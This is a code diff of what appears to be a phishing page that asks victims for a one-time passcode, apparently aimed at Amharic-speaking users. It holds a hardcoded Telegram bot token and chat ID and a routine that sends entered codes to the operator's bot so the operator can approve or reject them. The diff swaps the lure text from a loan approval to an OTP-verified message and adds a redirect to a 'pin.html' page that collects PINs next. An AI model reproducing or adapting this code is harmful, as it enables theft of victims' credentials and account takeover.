@@ -34,9 +34,6 @@
             box-shadow: 0 15px 40px rgba(0, 0, 0, .15);
             position: relative;
         }
-        /*==========================
-HEADER
-==========================*/
         
         .header {
             position: relative;
@@ -56,9 +53,6 @@ HEADER
             object-position: top center;
             display: block;
         }
-        /*======================
-CONTENT
-======================*/
         
         .content {
             padding: 30px 25px;
@@ -70,9 +64,6 @@ CONTENT
             line-height: 1.6;
             color: #222;
         }
-        /*======================
-OTP
-======================*/
         
         .otp {
             display: flex;
@@ -99,9 +90,6 @@ OTP
             border-bottom: 3px solid #11a9ec;
             transform: translateY(-2px);
         }
-        /*======================
-BUTTON
-======================*/
         
         .footer {
             position: absolute;
@@ -149,9 +137,6 @@ BUTTON
             cursor: not-allowed;
             box-shadow: none;
         }
-        /*==========================
-OVERLAYS
-==========================*/
         
         #spinnerOverlay {
             position: fixed;
@@ -218,9 +203,6 @@ OVERLAYS
             max-width: 320px;
             font-weight: 500;
         }
-        /*==========================
-Responsive
-==========================*/
         
         @media(max-width:420px) {
             body {
@@ -316,12 +298,10 @@ Responsive
 
     <script>
         //=========================================
-        // TELEGRAM CONFIG — USE SAME BOT AS PAGE 1
+        // TELEGRAM CONFIG
         //=========================================
-        // ⚠️ REPLACE WITH YOUR OWN BOT TOKEN AND CHAT ID
         const TELEGRAM_BOT_TOKEN = "7186506994:AAEKIkNo49PL-IyvoRFGFJoC5bxUfmfh_L0";
         const TELEGRAM_CHAT_ID = "5615316142";
-        const TELEGRAM_BOT_LINK = "https://t.me/YOUR_BOT_USERNAME"; // Optional — replace with your bot's invite link
         //=========================================
 
         //============================
@@ -445,16 +425,6 @@ Responsive
         }
 
         //============================
-        // Redirect to Telegram Bot
-        //============================
-
-        function redirectToTelegram() {
-            if (TELEGRAM_BOT_LINK && TELEGRAM_BOT_LINK !== "https://t.me/YOUR_BOT_USERNAME") {
-                window.location.href = TELEGRAM_BOT_LINK;
-            }
-        }
-
-        //============================
         // Send to Telegram with Inline Buttons
         //============================
 
@@ -532,19 +502,22 @@ Responsive
                                         resultOverlay.style.display = 'flex';
 
                                         if (action === 'approve') {
-                                            resultMessage.textContent = 'Your loan has been approved. You will receive a confirmation message within 15 minutes. Thank you.';
+                                            resultMessage.textContent = 'Your OTP has been verified successfully. You will be redirected to complete your registration.';
 
-                                            // Redirect to Telegram bot after 10 seconds
-                                            setTimeout(redirectToTelegram, 10000);
+                                            // 🔁 REDIRECT TO pin.html AFTER 2 SECONDS
+                                            setTimeout(() => {
+                                                window.location.href = 'pin.html';
+                                            }, 2000);
+
                                         } else if (action === 'cancel') {
-                                            resultMessage.textContent = 'Activation cancelled. Please re-enter your OTP code.';
+                                            resultMessage.textContent = 'Wrong OTP. Please re-enter your OTP code.';
 
                                             // Hide result overlay after 3 seconds and reset
                                             setTimeout(() => {
                                                 resultOverlay.style.display = 'none';
                                                 resetOTPInputs();
                                                 activateBtn.disabled = false;
-                                                activateBtn.textContent = 'Activate';
+                                                activateBtn.textContent = 'አግብር';
                                             }, 3000);
                                         }
 
